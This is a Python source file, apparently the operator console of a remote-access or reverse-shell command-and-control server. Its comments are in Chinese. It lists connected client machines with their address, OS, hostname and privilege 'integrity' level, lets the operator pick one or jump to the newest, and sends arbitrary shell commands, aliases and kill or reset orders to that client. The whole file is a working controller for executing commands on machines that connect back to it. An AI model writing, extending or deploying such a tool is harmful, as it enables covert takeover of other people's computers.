import subprocess
import sys
import threading

import tabulate

from server.config import SOCKET_ADDR
from server.core import Server
from server.util import *


def start_cli():
    os.system('')
    while True:
        try:
            command = colored_input('flc> ')
            if not command:
                continue
            name, arg = parse(command)
            # 切换目录
            if name == 'cd':
                cd(arg)
            # 清屏
            elif command in ['cls', 'clear']:
                subprocess.call(command, shell=True)
            # 退出
            elif command in ['quit', 'exit']:
                server.socket.close()
                sys.exit(0)
            # 查看客户端列表
            elif command in ['l', 'list']:
                list_connections()
            # 连接到客户端
            elif name == 'select':
                open_connection(get_target_connection(arg))
            # 快速连接到最近上线的客户端
            elif command == 'q':
                open_connection(get_last_connection())
            else:
                try:
                    open_connection(get_target_connection(command))
                except:
                    raise Exception('Command not recognized')
        except KeyboardInterrupt:
            print(colors.RESET)
            server.socket.close()
            sys.exit(0)
        except Exception as e:
            print(f'{colors.BRIGHT_RED}[-] {e}{colors.RESET}')
        finally:
            print()


def list_connections():
    server.test_connections()
    conns = []
    for i, connection in enumerate(server.connections):
        conns.append([i, connection.info['addr'], connection.info['os'], connection.info['hostname'],
                      connection.info['integrity']])
    print(tabulate.tabulate(conns, headers=['ID', 'Address', 'OS', 'Hostname', 'Integrity'], tablefmt='pretty'))
    # print('{} {}'.format(i, connection.info))


def get_target_connection(idx):
    server.test_connections()
    try:
        return server.connections[int(idx)]
    except (ValueError, IndexError):
        raise Exception('Not a valid selection')


def get_last_connection():
    server.test_connections()
    try:
        return server.connections[len(server.connections) - 1]
    except IndexError:
        raise Exception('No connection at this time')


def open_connection(conn):
    # 发送空命令
    conn.send_command('null', 'null')
    # 接收工作路径
    wd = conn.recv_result()[1]
    print('[+] Connected to {}'.format(conn.address))
    # 服务端内置命令
    internal_cmd = get_internal_cmd()
    # 客户端用户权限
    user_type = get_user_type(conn.info['integrity'])
    while True:
        try:
            command = colored_input(
                f'{wd}{colors.BRIGHT_GREEN}({user_type}){colors.END}> ' if user_type else f'{wd}> ')
            if not command:
                continue
            name, arg = parse(command)
            # 退出
            if command in ['quit', 'exit']:
                break
            # 关闭/重启客户端
            elif command in ['kill', 'reset']:
                conn.send_command(command)
                break
            # 切换到最新的连接
            elif command == 'q':
                connection = get_last_connection()
                if connection == conn:
                    continue
                open_connection(connection)
                break
            # 内置命令
            elif name in internal_cmd:
                if not internal_cmd[name](arg, conn):
                    continue
            # 命令别名
            elif name in AliasUtil.list():
                send_alias(conn, command)
            else:
                conn.send_command(command)
            # 接收结果
            status, result = conn.recv_result()
            if not status:
                result = colors.BRIGHT_RED + result + colors.RESET
            print(result)
            # 接收工作路径
            wd = conn.recv_result()[1]
        except ConnectionResetError:
            print('[-] Connection closed')
            break
        except KeyboardInterrupt:
            print(colors.RESET)
            break
        except Exception as e:
            print('[-] Error: {}'.format(e))


if __name__ == '__main__':
    server = Server(SOCKET_ADDR)
    threading.Thread(target=server.serve, daemon=True).start()
    start_cli()
